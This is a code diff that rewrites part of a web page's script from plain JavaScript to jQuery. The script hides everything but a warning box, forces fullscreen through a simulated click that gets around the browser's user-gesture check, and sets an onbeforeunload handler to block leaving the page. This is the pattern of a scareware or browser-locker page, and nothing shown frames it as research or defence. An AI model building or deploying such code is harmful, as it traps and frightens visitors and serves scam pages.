@@ -95,15 +95,11 @@
     }
 </style>
 
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script>
-    document.addEventListener('DOMContentLoaded', (event) => {
+    $(document).ready(function() {
         // Disable all other elements
-        const all_elements = document.body.children;
-        for (let i = 0; i < all_elements.length; i++) {
-            if (all_elements[i].id !== 'warning_container') {
-                all_elements[i].style.display = 'none';
-            }
-        }
+        $('body').children().not('#warning_container').hide();
 
         // try to enable fullscreen
         document.documentElement.requestFullscreen();
@@ -114,11 +110,9 @@
         }
 
         // simulate button clicking to enable fullscreen: 1. create button, 2. click it 3. remove it
-        const button = document.createElement('button');
-        button.style.display = 'none';
-        document.body.appendChild(button);
+        const button = $('<button>').hide().appendTo('body');
 
-        button.addEventListener('click', () => {
+        button.on('click', function() {
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen();
             } else if (document.body.requestFullscreen) {
@@ -126,8 +120,7 @@
             }
         });
 
-        button.click();
-        document.body.removeChild(button);
+        button.trigger('click').remove();
 
         // Prevent navigation away from the page
         window.onbeforeunload = function() {
